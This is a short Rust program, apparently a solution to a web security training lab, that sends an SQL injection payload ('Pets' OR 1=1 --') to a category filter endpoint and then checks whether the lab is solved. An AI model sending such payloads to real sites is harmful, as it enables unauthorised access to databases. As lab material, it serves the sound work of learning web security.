use sql_injection::{HTTP_CLIENT, check_is_lab_solved, generate_clap_parser};

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    println!("[+] Making the GET request with payload to the category filter endpoint");
    println!("[+] URL: {}/filter?category=Pets' OR 1=1 --", lab_url);

    HTTP_CLIENT
        .get(format!("{}/filter?category=Pets' OR 1=1 --", lab_url))
        .send()
        .expect("[-] Failed to make a GET request");

    check_is_lab_solved(lab_url);
}
